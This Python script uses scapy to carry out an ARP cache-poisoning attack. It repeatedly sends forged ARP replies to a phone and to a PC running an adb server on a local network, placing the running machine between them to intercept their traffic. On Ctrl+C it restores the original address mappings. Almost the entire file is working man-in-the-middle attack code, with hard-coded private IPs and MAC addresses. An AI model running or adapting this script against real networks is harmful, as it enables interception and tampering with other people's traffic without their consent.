import os
import sys

if os.name != 'nt': # IF os is not windows
    sys.path.append('../venv/lib/python3.8/site-packages')


from scapy.all import *

import argparse
import time

host = "192.168.33.40"  # PC, adb server
target = "192.168.33.16" # phone
ip_mac = {
    host: 'a4:fc:77:26:9e:2f',
    target: 'da:7d:38:5f:cb:52'
}


def get_mac(ip):
    global ip_mac
    if ip in ip_mac:
        return ip_mac[ip]
    ans, _ = arping(ip, verbose=False)
    if ans:
        return ans[0][1][1].hwsrc
    # print(ans)


def spoof(target_ip, host_ip, target_mac, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target

    target_mac = get_mac(target_ip)

    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)

    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    verbose = True

    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(3)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
        print("[!] Finish.")